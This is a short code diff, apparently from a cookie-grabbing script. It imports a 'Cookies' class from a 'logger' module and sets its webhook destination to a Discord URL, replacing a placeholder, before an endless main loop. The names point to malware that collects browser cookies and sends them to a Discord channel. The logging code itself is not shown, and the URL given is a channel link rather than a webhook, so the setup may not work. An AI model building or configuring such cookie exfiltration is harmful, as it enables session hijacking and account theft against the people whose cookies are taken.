@@ -1,6 +1,6 @@
 from logger import Cookies
 
-log = Cookies('weebhook url here')
+log = Cookies('https://discord.com/channels/@me/1241616012118458429')
 
 def main():
   while True:
